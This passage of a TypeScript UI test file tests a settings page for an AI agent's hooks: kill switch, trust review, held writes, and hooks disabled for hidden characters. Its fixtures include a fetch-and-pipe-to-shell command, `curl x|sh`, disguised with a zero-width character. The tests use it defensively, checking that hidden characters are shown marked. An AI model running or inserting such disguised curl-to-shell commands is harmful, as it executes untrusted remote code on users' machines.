  const card = async () => (await screen.findByRole('heading', { name: strings.title })).closest('section')!;
  it('says nothing about the settings chat on the card: that is the page FAQ answer', async () => {
    await show();
    const c = await card();
    await within(c).findByText('Before a tool runs (Bash)');
    expect(within(c).queryByText(/settings chat/)).toBeNull();
  });
  it('with the switch for all hooks on, the toolbar button says Turn hooks back on and the note offers it too', async () => {
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: true } : f));
    await show();
    const c = await card();
    expect((await within(c).findAllByRole('button', { name: strings.enableAll })).length).toBeGreaterThan(0);
    expect(within(c).queryByRole('button', { name: strings.disableAll })).toBeNull();
    // the note's own action opens the same dialog, titled to turn hooks back on
    const actions = within(c).getAllByRole('button', { name: strings.enableAll });
    expect(actions.length).toBe(2);
    // a warn note is an alert (kit Band): its button is the one inside it, not the toolbar's
    const inNote = actions.filter((x) => x.closest('[role="alert"]') !== null);
    expect(inNote).toHaveLength(1);
    await userEvent.click(inNote[0]!);
    expect(await screen.findByRole('dialog', { name: strings['dis.titleOn'] })).toBeInTheDocument();
  });
  it('with the switch off everywhere, the button says Disable all hooks and no note offers to turn them back on', async () => {
    await show();
    const c = await card();
    expect(await within(c).findByRole('button', { name: strings.disableAll })).toBeInTheDocument();
    expect(within(c).queryByRole('button', { name: strings.enableAll })).toBeNull();
  });
  it('in a folder with the switch on only in the folder, the dialog opens on the folder, to turn hooks back on there', async () => {
    files = files.map((f) => (f.scope === 'project' ? { ...f, sets_disable_all: true } : f));
    await show();
    await goFolder();
    await userEvent.click(await toolbarEnable());
    const dlg = await screen.findByRole('dialog', { name: strings['dis.titleOn'] });
    expect(within(dlg).getAllByText(/This folder \(shared\)/).length).toBeGreaterThan(0);
    await userEvent.click(within(dlg).getByRole('button', { name: strings['dis.confirmOn'] }));
    await flush();
    expect(writes()[0]!.body).toMatchObject({ scope: 'project', value: false });
  });
});

describe('hooks: the kill switch says what it reaches', () => {
  it('with the switch on in two files, clearing one says other files may keep hooks off, and the banner names both', async () => {
    files = files.map((f) => (f.scope === 'user' || f.scope === 'project' ? { ...f, sets_disable_all: true } : f));
    await show();
    await goFolder();
    expect(await screen.findByText(/All hooks are turned off in This realm, This folder \(shared\)/)).toBeInTheDocument();
    await userEvent.click(await toolbarEnable());
    const dlg = await screen.findByRole('dialog');
    expect(within(dlg).getByText(/Hooks run again only if no other settings file still has the switch on/)).toBeInTheDocument();
  });
  it('turning it on says it reaches hooks saved in other files', async () => {
    await show();
    await userEvent.click(await screen.findByRole('button', { name: strings.disableAll }));
    const dlg = await screen.findByRole('dialog');
    expect(within(dlg).getByText(/including hooks saved in other files/)).toBeInTheDocument();
  });
});

// Two holds at once and a check made while an older read is still out: the page-side guards of useHookWrite, which
// are NOT redundant with core.
let direct: { ch: HookChange; at: ReturnType<typeof usePlace>['at']; hold: ReturnType<typeof useSettingsHold> } | null = null;
function Direct() {
  const { at } = usePlace();
  const hold = useSettingsHold(at);
  useHooksList(at, hold);
  const ch = useHookWrite(at);
  direct = { ch, at, hold };
  return null;
}
async function showDirect() {
  function H() {
    const target = useCurrentComputer();
    const realm = useRealms().selected;
    return target ? (<PlaceProvider target={target} realm={realm}><PlaceBar computer="atlas" /><Direct /></PlaceProvider>) : null;
  }
  const router = createRouter({ routeTree: createRootRoute({ component: H }), history: createMemoryHistory({ initialEntries: ['/ai/rules'] }) });
  await act(async () => { render(<QueryClientProvider client={queryClient}><RouterProvider router={router} /></QueryClientProvider>); await router.load(); });
  await flush();
}
const vars = (scope: 'user' | 'project', command: string, disabled: boolean): HookVars => ({
  ...(direct!.at as NonNullable<typeof direct>['at'] & object), hold: direct!.hold!, scope, op: 'toggle', hook: { event: 'PreToolUse', matcher: 'Bash', command }, disabled,
} as HookVars);

describe('hooks: no read releases a hold', () => {
  it('a hook that cannot be named whole is refused by the sender itself: nothing is minted or sent, even when a caller asks', async () => {
    await showDirect();
    await flush();
    const bad = { ...vars('user', '', true), hook: { event: 'PreToolUse', matcher: 'Bash', command: '' } } as HookVars;
    const long = { ...vars('user', './x.sh', true), hook: { event: 'PreToolUse', matcher: 'm'.repeat(5000), command: './x.sh' } } as HookVars;
    await act(async () => { await direct!.ch.run(bad); });
    await act(async () => { await direct!.ch.run(long); });
    await flush();
    expect(begins()).toHaveLength(0);
    expect(writes()).toHaveLength(0);
    expect(heldChanges(HOOKS_LOCK, { realm: R1 })).toHaveLength(0);
  });
  it('with two held changes, a check (even one that shows both applied) frees neither; each ends only by its own Stop tracking', async () => {
    hooks = [
      { event: 'PreToolUse', matcher: 'Bash', command: './a.sh', source: U },
      { event: 'PreToolUse', matcher: 'Bash', command: './b.sh', source: P },
    ];
    over.toggle = (c) => {
      hooks = hooks.map((h) => (h.command === c.body?.command ? { ...h, disabled: c.body?.disabled === true } : h));
      return { status: 0, network: true };
    };
    await showDirect();
    await goFolder();
    await flush();
    await act(async () => { await direct!.ch.run(vars('user', './a.sh', true)); });
    await act(async () => { await direct!.ch.run(vars('project', './b.sh', true)); });
    await flush();
    expect(heldChanges(HOOKS_LOCK, { realm: R1 })).toHaveLength(2);
    const before = lists().length;
    let started = false;
    await act(async () => { started = await direct!.ch.check(); });
    await flush();
    expect(started).toBe(true);
    expect(lists().length).toBeGreaterThan(before);
    expect(heldChanges(HOOKS_LOCK, { realm: R1 })).toHaveLength(2);
    let stopped = false;
    await act(async () => { stopped = await direct!.ch.stopWaiting(); });
    await flush();
    expect(stopped).toBe(true);
    expect(heldChanges(HOOKS_LOCK, { realm: R1 })).toHaveLength(1);
    expect(writes()).toHaveLength(2);
  });
});

// ---- trusting the hooks the agent holds ----

const acks = () => calls.filter((c) => c.method === 'POST' && pathOf(c) === '/hooks/trust/ack');
const pending = (over: Record<string, unknown> = {}) => { trust = { state: 'pending', hash: 'hp', reason: 'a hook changed', unverifiable: null, acked_by: '', ...over }; };
const REVIEW = strings['trust.action'];
const TRUST = trustStrings.confirm;
const dialog = async () => within(await screen.findByRole('dialog', { name: trustStrings.title }));

describe('hooks: trusting the hooks', () => {
  it('offers Review and trust only while the agent holds the hooks', async () => {
    await show();
    await screen.findByText('Guard shell');
    expect(screen.queryByRole('button', { name: REVIEW })).toBeNull();
    cleanup();
    pending();
    await show();
    await screen.findByText('Guard shell');
    expect(screen.getByRole('button', { name: REVIEW })).toBeEnabled();
  });
  it('the dialog lists every command and when it runs, names the computer, starts on Cancel, and Cancel sends nothing', async () => {
    pending();
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const d = await dialog();
    expect(d.getByText('./guard.sh')).toBeInTheDocument();
    expect(d.getByText('Before a tool runs (Bash)')).toBeInTheDocument();
    expect(d.getByText('notify-send done')).toBeInTheDocument();
    expect(d.getByText(/When the agent finishes a turn \(any tool\) · off/)).toBeInTheDocument();
    expect(d.getByText('Once trusted, these hooks run on atlas, as you, each time their event happens.')).toBeInTheDocument();
    expect(d.getByText('Reviewed set')).toBeInTheDocument();
    expect(d.getByText('hp')).toBeInTheDocument();
    expect(d.getByRole('button', { name: 'Cancel' })).toHaveFocus();
    const before = lists().length;
    await userEvent.click(d.getByRole('button', { name: 'Cancel' }));
    await flush();
    expect(screen.queryByRole('dialog', { name: trustStrings.title })).toBeNull();
    expect(acks()).toHaveLength(0);
    expect(lists().length).toBe(before);
  });
  it('a plain set: re-reads the hooks, then sends the reviewed hash with high_risk false, once; the Band goes with the next read', async () => {
    pending();
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const before = lists().length;
    await userEvent.click((await dialog()).getByRole('button', { name: TRUST }));
    await flush();
    expect(acks()).toHaveLength(1);
    expect(acks()[0]!.body).toEqual({ session_id: 's1', hash: 'hp', high_risk: false });
    expect(begins()).toHaveLength(0);
    // the re-read before the send, then the list after it
    expect(lists().length).toBeGreaterThanOrEqual(before + 2);
    expect(await screen.findByText(strings.done)).toBeInTheDocument();
    expect(screen.queryByText(/held until someone reviews them/)).toBeNull();
  });
  it('a set with unverifiable targets lists them and needs a second tick; it then sends high_risk true', async () => {
    pending({ unverifiable: ['/opt/tools/check.sh', 'https://example.test/hook'] });
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const d = await dialog();
    expect(d.getByText('/opt/tools/check.sh')).toBeInTheDocument();
    expect(d.getByText('https://example.test/hook')).toBeInTheDocument();
    expect(d.queryByRole('button', { name: TRUST })).toBeNull();
    // focus starts on Cancel even though the tick box is the first control in the body
    expect(d.getByRole('button', { name: 'Cancel' })).toHaveFocus();
    const go = d.getByRole('button', { name: trustStrings.confirmRisk });
    expect(go).toBeDisabled();
    await userEvent.click(d.getByRole('checkbox', { name: trustStrings.agree }));
    expect(go).toBeEnabled();
    await userEvent.click(go);
    await flush();
    expect(acks()).toHaveLength(1);
    expect(acks()[0]!.body).toEqual({ session_id: 's1', hash: 'hp', high_risk: true });
  });
  it('hooks that changed while the dialog was open send nothing and say so; the new set is read', async () => {
    pending();
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const d = await dialog();
    pending({ hash: 'hp2' });
    await userEvent.click(d.getByRole('button', { name: TRUST }));
    await flush();
    expect(acks()).toHaveLength(0);
    expect(await screen.findByText(strings['notsent.TRUST_CHANGED'])).toBeInTheDocument();
    expect(screen.queryByText(HELD)).toBeNull();
  });
  it('unverifiable targets that changed under the same hash send nothing either', async () => {
    pending({ unverifiable: ['/opt/a.sh'] });
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const d = await dialog();
    await userEvent.click(d.getByRole('checkbox', { name: trustStrings.agree }));
    pending({ unverifiable: ['/opt/a.sh', '/opt/b.sh'] });
    await userEvent.click(d.getByRole('button', { name: trustStrings.confirmRisk }));
    await flush();
    expect(acks()).toHaveLength(0);
    expect(await screen.findByText(strings['notsent.TRUST_CHANGED'])).toBeInTheDocument();
  });
  it('hooks trusted elsewhere while the dialog was open send nothing', async () => {
    pending();
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const d = await dialog();
    trust = { state: 'ok', hash: 'hp' };
    await userEvent.click(d.getByRole('button', { name: TRUST }));
    await flush();
    expect(acks()).toHaveLength(0);
  });
  it('the agent refusing it (the one bare 400) says nothing was changed, is not held and is not resent; the list is read again', async () => {
    pending();
    over.ack = () => ({ status: 400, body: { error: 'config_changed prose', code: 'bad_request' } });
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const before = lists().length;
    await userEvent.click((await dialog()).getByRole('button', { name: TRUST }));
    await flush();
    expect(acks()).toHaveLength(1);
    expect(await screen.findByText(strings['refused.bad_request'])).toBeInTheDocument();
    expect(screen.queryByText(HELD)).toBeNull();
    // The guarded re-read before the send, then the reload that follows a refusal.
    expect(lists().length).toBe(before + 2);
  });
  it('a lost answer is held as unknown: nothing is resent, Check again frees nothing, only Stop tracking does', async () => {
    pending();
    over.ack = () => ({ status: 0, network: true });
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    await userEvent.click((await dialog()).getByRole('button', { name: TRUST }));
    await flush();
    expect(await screen.findByText(/Outcome unknown: a hook change \(trust these hooks\) may have gone through/)).toBeInTheDocument();
    expect(screen.queryByText(strings.done)).toBeNull();
    expect(screen.getByRole('button', { name: REVIEW })).toBeDisabled();
    await userEvent.click(screen.getByRole('button', { name: /Check again/ }));
    await flush();
    expect(screen.getByText(/Outcome unknown: a hook change/)).toBeInTheDocument();
    await stopTracking();
    expect(screen.queryByText(/Outcome unknown: a hook change/)).toBeNull();
    expect(acks()).toHaveLength(1);
  });
  it('an answer that is not the agent\'s "ok" is not taken as trusted: it is held as unknown', async () => {
    pending();
    over.ack = () => ({ status: 200, body: { status: 'pending' } });
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    await userEvent.click((await dialog()).getByRole('button', { name: TRUST }));
    await flush();
    expect(await screen.findByText(HELD)).toBeInTheDocument();
    expect(screen.queryByText(strings.done)).toBeNull();
    expect(acks()).toHaveLength(1);
  });
  it('the settings chat ending while the acknowledgement is out leaves it held as unknown, never reported as not sent', async () => {
    pending();
    over.ack = () => { mgr.closeNow(); return { status: 200, body: { status: 'ok' } }; };
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    await userEvent.click((await dialog()).getByRole('button', { name: TRUST }));
    await flush();
    expect(await screen.findByText(HELD)).toBeInTheDocument();
    expect(acks()).toHaveLength(1);
  });
  it('a command too long to show whole cannot be trusted from here', async () => {
    pending();
    hooks = [{ event: 'Stop', command: `run ${'x'.repeat(2100)}`, source: U, label: 'Long one' }];
    await show();
    await screen.findByText('Long one');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const d = await dialog();
    expect(d.getByText(trustStrings.toolong)).toBeInTheDocument();
    expect(d.getByRole('button', { name: TRUST })).toBeDisabled();
    expect(acks()).toHaveLength(0);
  });
  it('a lost session is replaced at the re-read and the acknowledgement goes to the new chat, once', async () => {
    pending();
    await show();
    await screen.findByText('Guard shell');
    await userEvent.click(screen.getByRole('button', { name: REVIEW }));
    const d = await dialog();
    let first = true;
    over.list = () => { if (first) { first = false; return { status: 404, body: { error: 'x', code: 'not_found' } }; } return undefined; };
    await userEvent.click(d.getByRole('button', { name: TRUST }));
    await flush();
    expect(created).toBe(2);
    expect(acks()).toHaveLength(1);
    expect(acks()[0]!.body).toMatchObject({ session_id: 's2', hash: 'hp' });
  });
});

// The condition line spelled out here, not read from the strings file, so a run on the old code fails on the behaviour itself.
const whenLine = (atoms: string): string => `Runs only when: ${atoms}`;
// The read-only condition line of a Stop hook (call_when), plain text, and the words for one the page cannot show.
describe('hook conditions on the list', () => {
  it('shows "Runs only when" under a hook with a condition, and nothing under one without', async () => {
    hooks = [
      { event: 'Stop', command: './check.sh', source: U, label: 'Check tests', when: ['+edit_file|write_file', '-bash\u001b[31m'] },
      { event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', source: U, label: 'Guard shell' },
    ];
    await show();
    // The escape is marked as the agent marks it, never dropped: the person reads what the condition holds.
    expect(await screen.findByText(whenLine('+edit_file|write_file, -bash⟨ESC⟩[31m'))).toBeInTheDocument();
    expect(screen.queryAllByText(/Runs only when/)).toHaveLength(1);
  });
  it('a condition the page cannot show says so in words, and the hook stays listed', async () => {
    hooks = [{ event: 'Stop', command: './check.sh', source: U, label: 'Check tests', when: 'not a list' }];
    await show();
    expect(await screen.findByText(strings['when.unreadable'])).toBeInTheDocument();
    expect(screen.getByText('Check tests')).toBeInTheDocument();
  });
});

// The condition and the hook's state stay on screen when the table is narrow. jsdom has no layout, so
// the table's width is given through ResizeObserver; the kit then sheds columns or draws the two-line list.
describe('a narrow hooks table keeps the condition and the state', () => {
  const atWidth = (width: number) =>
    class {
      constructor(private cb: (e: { contentRect: { width: number } }[]) => void) {}
      observe() { this.cb([{ contentRect: { width } }]); }
      unobserve() {}
      disconnect() {}
    };
  afterEach(() => { vi.unstubAllGlobals(); });
  const conditioned = () => {
    hooks = [
      { event: 'Stop', command: './check.sh', source: U, label: 'Check tests', when: ['+edit_file'] },
      { event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', source: U, label: 'Guard shell' },
    ];
  };
  // 584 px is the least the table needs here (Hook 220 + Condition 200 + State 120 + actions 44); below it the list.
  const drawnAsTable = () => document.querySelector('table colgroup') !== null;
  for (const width of [300, 360, 450, 560, 583]) {
    it(`at ${width} px (the list) the condition, what each hook runs on, where it is saved and its On/Off state all still show`, async () => {
      vi.stubGlobal('ResizeObserver', atWidth(width));
      conditioned();
      await show();
      const r = within(row(await screen.findByText('Check tests')));
      expect(drawnAsTable()).toBe(false);
      expect(r.getByText(whenLine('+edit_file'))).toBeInTheDocument();
      expect(r.getByText(/^When the agent finishes a turn/)).toBeInTheDocument();
      expect(r.getByText(strings['state.on'])).toBeInTheDocument();
      expect(r.getByText(strings['scope.user'])).toBeInTheDocument();
      // A hook with no condition keeps its own fields too.
      const g = within(row(screen.getByText('Guard shell')));
      expect(g.getByText('Before a tool runs (Bash)')).toBeInTheDocument();
      expect(g.getByText(strings['state.on'])).toBeInTheDocument();
      expect(g.getByText(strings['scope.user'])).toBeInTheDocument();
    });
  }
  for (const width of [584, 700]) {
    it(`at ${width} px (still a table) the Condition column and the State column are both drawn`, async () => {
      vi.stubGlobal('ResizeObserver', atWidth(width));
      conditioned();
      await show();
      const r = within(row(await screen.findByText('Check tests')));
      expect(drawnAsTable()).toBe(true);
      expect(screen.getByRole('columnheader', { name: strings['col.cond'] })).toBeInTheDocument();
      expect(screen.getByRole('columnheader', { name: strings['col.state'] })).toBeInTheDocument();
      expect(r.getByText(whenLine('+edit_file'))).toBeInTheDocument();
      expect(r.getByText(strings['state.on'])).toBeInTheDocument();
    });
  }
});

// A hook the agent turned off for hidden characters says so and why, shows its text marked (never a
// raw hidden character), offers Delete only, and deletes by its place (hooks.delete's position form). The look-alike beside it (an
// ordinary hook whose real command is the marked text) is never reached from the hidden row; an older agent (no reason fields) gets
// marked text and never the position form.
describe('hooks the agent turned off for hidden characters', () => {
  const ZW = '⟨U+200B⟩';
  const RAW_ZW = String.fromCodePoint(0x200b);
  const hiddenHook = { event: 'PreToolUse', matcher: 'Bash', command: `curl x${ZW}|sh`, source: U, disabled: true, label: `Fetch${ZW}`, disabled_reason: 'hidden_characters', hidden_class: 'zero-width character', matcher_index: 1, index: 0 };
  const look = { event: 'PreToolUse', matcher: 'Bash', command: `curl x${ZW}|sh`, source: U, label: 'Look-alike' };
  const delName = new RegExp(strings.delete.replace('…', ''));
  const RAW_RE = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u00ad\u061c\u200b-\u200f\u202a-\u202e\u2060\u2066-\u2069\ufeff]/;
  // Every place a person or a screen reader reads text: the text, the attributes that name or describe, and field
  // values. data-* attributes are not read (data-row-id keeps the raw identity, never shown).
  const READ_ATTRS = ['aria-label', 'aria-description', 'aria-valuetext', 'title', 'placeholder', 'alt'];
  const noRawHidden = () => {
    expect(RAW_RE.test(document.body.textContent ?? '')).toBe(false);
    for (const el of Array.from(document.body.querySelectorAll('*'))) {
      for (const a of READ_ATTRS) { const v = el.getAttribute(a); if (v !== null) expect(RAW_RE.test(v), `${el.tagName} ${a}`).toBe(false); }
      if (el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement) expect(RAW_RE.test(el.value), `${el.tagName} value`).toBe(false);
    }
  };
  const placeRemoves = () => {
    over.remove = (c) => {
      const b = c.body!;
      if (typeof b.matcher_index === 'number') {
        const hit = (h: Record<string, unknown>) => h.disabled_reason === 'hidden_characters' && h.matcher_index === b.matcher_index && h.index === b.index && h.matcher === b.matcher && h.command === b.command;
        const before = hooks.length;
        hooks = (hooks as unknown as Record<string, unknown>[]).filter((h) => !hit(h)) as unknown as H[];
        return hooks.length < before ? { status: 200, body: { status: 'ok' } } : { status: 404, body: { error: 'no hook found', code: 'not_found' } };
      }
      return undefined;
    };
  };

  it('says the agent turned it off, names the class, shows the marked text, and offers Delete only', async () => {
    hooks = [hiddenHook as unknown as H];
    await show();
    const r = within(row(await screen.findByText(`Fetch${ZW}`)));
    expect(r.getByText(strings['state.hidden'])).toBeInTheDocument();
    expect(screen.getByText(new RegExp(strings['hidden.band'].split('{{what}}')[0]!.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')))).toHaveTextContent(strings['class.zeroWidth']);
    noRawHidden();
    await userEvent.click(row(screen.getByText(`Fetch${ZW}`)).querySelector('[data-row-menu] button') as HTMLElement);
    expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOn) })).toHaveAttribute('aria-disabled', 'true');
    expect(await screen.findByRole('menuitem', { name: delName })).not.toHaveAttribute('aria-disabled', 'true');
    expect(writes()).toHaveLength(0);
  });

  it('Delete confirms with the marked command, then sends the place: event, matcher_index, index, matcher and command as listed', async () => {
    hooks = [hiddenHook as unknown as H];
    placeRemoves();
    await show();
    await rowMenu(`Fetch${ZW}`, strings.delete.replace('…', ''));
    const dlg = await screen.findByRole('alertdialog');
    expect(within(dlg).getByText(`curl x${ZW}|sh`)).toBeInTheDocument();
    expect(within(dlg).getByText(strings['del.hiddenEffect'])).toBeInTheDocument();
    // it never ran (the agent had turned it off): removed, never "stops running"
    expect(within(dlg).getByText(strings['del.hiddenRemoved'].replace('{{where}}', strings['scope.user']))).toBeInTheDocument();
    expect(within(dlg).queryByText(/stops running/)).toBeNull();
    // it is off, so it does not run: the dialog does not claim it "never ran"
    expect(within(dlg).getByText(/The agent has turned it off, so it does not run\.$/)).toBeInTheDocument();
    expect(within(dlg).queryByText(/never ran/)).toBeNull();
    noRawHidden();
    await userEvent.click(within(dlg).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(begins()[0]!.body).toMatchObject({ op: 'delete', scope: 'user' });
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.method).toBe('DELETE');
    expect(writes()[0]!.body).toEqual({ session_id: 's1', nonce: 'nonce-1', scope: 'user', event: 'PreToolUse', matcher: 'Bash', command: `curl x${ZW}|sh`, matcher_index: 1, index: 0 });
    expect(hooks).toHaveLength(0);
  });

  it('THE LOOK-ALIKE: deleting the hidden hook removes it alone; the look-alike stays, and its own row offers no change while the hidden one is listed', async () => {
    hooks = [hiddenHook as unknown as H, look];
    placeRemoves();
    await show();
    await screen.findByText('Look-alike');
    // The look-alike is read only (twin) beside the hidden hook: nothing can be sent from its row.
    await userEvent.click(row(screen.getByText('Look-alike')).querySelector('[data-row-menu] button') as HTMLElement);
    expect(await screen.findByRole('menuitem', { name: delName })).toHaveAttribute('aria-disabled', 'true');
    expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAttribute('aria-disabled', 'true');
    await userEvent.keyboard('{Escape}');
    await rowMenu(`Fetch${ZW}`, strings.delete.replace('…', ''));
    await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.body).toMatchObject({ matcher_index: 1, index: 0 });
    expect(hooks.map((h) => h.label)).toEqual(['Look-alike']);
    expect(await screen.findByText('Look-alike')).toBeInTheDocument();
  });

  it('THE LOOK-ALIKE with spoofed place fields but no reason is an ordinary hook: its delete never carries a place', async () => {
    hooks = [{ ...look, matcher_index: 1, index: 0 } as unknown as H];
    await show();
    await rowMenu('Look-alike', strings.delete.replace('…', ''));
    await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.body).not.toHaveProperty('matcher_index');
    expect(writes()[0]!.body).not.toHaveProperty('index');
    expect(writes()[0]!.body).toMatchObject({ event: 'PreToolUse', matcher: 'Bash', command: `curl x${ZW}|sh` });
  });

  it('an older agent (no reason fields): a raw hidden character is shown marked, and the row never offers the position form', async () => {
    hooks = [{ event: 'PreToolUse', matcher: 'Bash', command: `curl x${RAW_ZW}|sh`, source: U, disabled: true, label: `Old${RAW_ZW}`, matcher_index: 0, index: 0 } as unknown as H];
    await show();
    expect(await screen.findByText(`Old${ZW}`)).toBeInTheDocument();
    noRawHidden();
    expect(screen.queryByText(strings['state.hidden'])).toBeNull();
    await rowMenu(`Old${ZW}`, strings.delete.replace('…', ''));
    const dlg = await screen.findByRole('alertdialog');
    expect(within(dlg).getByText(`curl x${ZW}|sh`)).toBeInTheDocument();
    noRawHidden();
    await userEvent.click(within(dlg).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(writes()).toHaveLength(1);
    // The old agent names the hook by its real (raw) text, the only form it has: never by place.
    expect(writes()[0]!.body).not.toHaveProperty('matcher_index');
    expect(writes()[0]!.body).toMatchObject({ command: `curl x${RAW_ZW}|sh` });
  });

  it('a hidden hook whose place the agent did not send whole is shown and turned off, but cannot be deleted here', async () => {
    hooks = [{ ...hiddenHook, index: -1 } as unknown as H];
    await show();
    // its own reason, on the action and in a band: the agent did not say where it is, never "it can only be deleted"
    expect(await screen.findByText(strings['readonly.noPlace'])).toBeInTheDocument();
    await userEvent.click(row(await screen.findByText(`Fetch${ZW}`)).querySelector('[data-row-menu] button') as HTMLElement);
    expect(await screen.findByRole('menuitem', { name: delName })).toHaveAttribute('aria-disabled', 'true');
    expect(screen.getByRole('menuitem', { name: delName })).toHaveAccessibleDescription(strings['readonly.short.noPlace']);
    expect(writes()).toHaveLength(0);
  });

  it('an older agent\'s hook whose text holds a hidden character can only be deleted: Turn off and Edit are off with the reason, so no edit form ever holds the raw character', async () => {
    hooks = [{ event: 'PreToolUse', matcher: 'Bash', command: `curl x${RAW_ZW}|sh`, source: U, label: 'Old shell' }];
    await show();
    await userEvent.click(row(await screen.findByText('Old shell')).querySelector('[data-row-menu] button') as HTMLElement);
    const short = strings['readonly.short.hiddenText'];
    const toggle = await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) });
    expect(toggle).toHaveAttribute('aria-disabled', 'true');
    expect(toggle).toHaveAccessibleDescription(short);
    const edit = screen.getByRole('menuitem', { name: /Edit/ });
    expect(edit).toHaveAttribute('aria-disabled', 'true');
    expect(edit).toHaveAccessibleDescription(short);
    expect(screen.getByRole('menuitem', { name: delName })).not.toHaveAttribute('aria-disabled', 'true');
    await userEvent.keyboard('{Escape}');
    expect(screen.getByText(strings['readonly.hiddenText'])).toBeInTheDocument();
    for (const i of screen.queryAllByRole('textbox')) expect((i as HTMLInputElement).value).not.toContain(RAW_ZW);
    noRawHidden();
    expect(writes()).toHaveLength(0);
    // Delete still names it by its real text (the triple): the older agent's only form, and the one that reaches it exactly.
    await rowMenu('Old shell', strings.delete.replace('…', ''));
    await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.body).toMatchObject({ event: 'PreToolUse', matcher: 'Bash', command: `curl x${RAW_ZW}|sh` });
    expect(writes()[0]!.body).not.toHaveProperty('matcher_index');
  });

  it('an older agent\'s running hook with a long raw hidden command and no position fields is deleted: the hold records a digest, so the record never passes core\'s cap', async () => {
    const ESC = String.fromCodePoint(0x1b);
    const command = `./x${ESC.repeat(1400)}`;
    expect(JSON.stringify(command).length).toBeGreaterThan(8192);
    expect(command.length).toBeLessThanOrEqual(4096);
    hooks = [{ event: 'PreToolUse', matcher: 'Bash', command, source: U, label: 'Old long' }];
    await show();
    await userEvent.click(row(await screen.findByText('Old long')).querySelector('[data-row-menu] button') as HTMLElement);
    expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAttribute('aria-disabled', 'true');
    expect(screen.getByRole('menuitem', { name: /Edit/ })).toHaveAttribute('aria-disabled', 'true');
    expect(screen.getByRole('menuitem', { name: delName })).not.toHaveAttribute('aria-disabled', 'true');
    await userEvent.keyboard('{Escape}');
    await rowMenu('Old long', strings.delete.replace('…', ''));
    await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    // one DELETE in the triple form, the raw command whole (the older agent's only form), and no hold refusal
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.method).toBe('DELETE');
    expect(writes()[0]!.body).toMatchObject({ event: 'PreToolUse', matcher: 'Bash', command });
    expect(writes()[0]!.body).not.toHaveProperty('matcher_index');
    expect(screen.queryByText(HELD)).toBeNull();
    noRawHidden();
  });

  it('a condition and an event name holding hidden characters are shown marked, never dropped or raw', async () => {
    hooks = [
      { event: 'Stop', command: './check.sh', source: U, label: 'Check tests', when: [`+edit${RAW_ZW}_file`] },
      { event: `Odd${RAW_ZW}Event`, command: './odd.sh', source: U, label: 'Odd one' },
    ];
    await show();
    expect(await screen.findByText(whenLine(`+edit${ZW}_file`))).toBeInTheDocument();
    expect(within(row(screen.getByText('Odd one'))).getByText(new RegExp(`Odd${ZW.replace(/[+]/g, '\\+')}Event`))).toBeInTheDocument();
    noRawHidden();
  });

  it('the trust dialog shows a hidden character marked, as the list does, so the set trusted is the text read', async () => {
    trust = { state: 'pending', hash: 'hp', reason: 'a hook changed', unverifiable: null, acked_by: '' };
    hooks = [{ event: 'PreToolUse', matcher: 'Bash', command: `curl x${RAW_ZW}|sh`, source: U, label: 'Old shell' }];
    await show();
    await screen.findByText('Old shell');
    await userEvent.click(screen.getByRole('button', { name: strings['trust.action'] }));
    const d = within(await screen.findByRole('dialog'));
    expect(d.getByText(`curl x${ZW}|sh`)).toBeInTheDocument();
    expect(d.queryByText('curl x|sh')).toBeNull();
    noRawHidden();
  });

  it('a condition the page cannot read leaves only Delete; a ZWJ emoji or a hidden character in a label is shown marked and locks nothing', async () => {
    const ZWJ_LABEL = `Deploy ${String.fromCodePoint(0x1f9d1, 0x200d, 0x1f4bb)}`;
    hooks = [
      { event: 'PreToolUse', matcher: 'Bash', command: './a.sh', source: U, label: ZWJ_LABEL },
      { event: 'PreToolUse', matcher: 'Bash', command: './c.sh', source: U, label: `${'L'.repeat(150)}${RAW_ZW}` },
      { event: 'Stop', command: './b.sh', source: U, label: 'Odd condition', when: [1, `x${RAW_ZW}`] },
    ];
    await show();
    // the labels: shown marked, every change offered, no "not what runs" band
    for (const name of [`Deploy ${String.fromCodePoint(0x1f9d1)}⟨U+200D⟩${String.fromCodePoint(0x1f4bb)}`, `${'L'.repeat(150)}${ZW}`]) {
      await userEvent.click(row(await screen.findByText(name)).querySelector('[data-row-menu] button') as HTMLElement);
